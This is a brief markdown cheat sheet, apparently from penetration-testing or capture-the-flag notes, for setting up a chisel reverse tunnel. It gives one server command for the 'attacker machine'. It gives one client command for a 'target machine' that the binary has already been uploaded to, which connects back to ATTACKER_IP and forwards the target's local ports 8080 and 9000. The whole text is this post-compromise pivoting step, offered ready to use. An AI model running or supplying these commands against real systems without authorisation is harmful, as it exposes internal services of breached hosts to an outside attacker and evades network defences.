# Chisel Tunnel Setup

# Attacker machine
./chisel server -p 9999 --reverse

# Target machine (after uploading chisel binary)
./chisel client ATTACKER_IP:9999 R:8080:127.0.0.1:8080 R:9000:127.0.0.1:9000
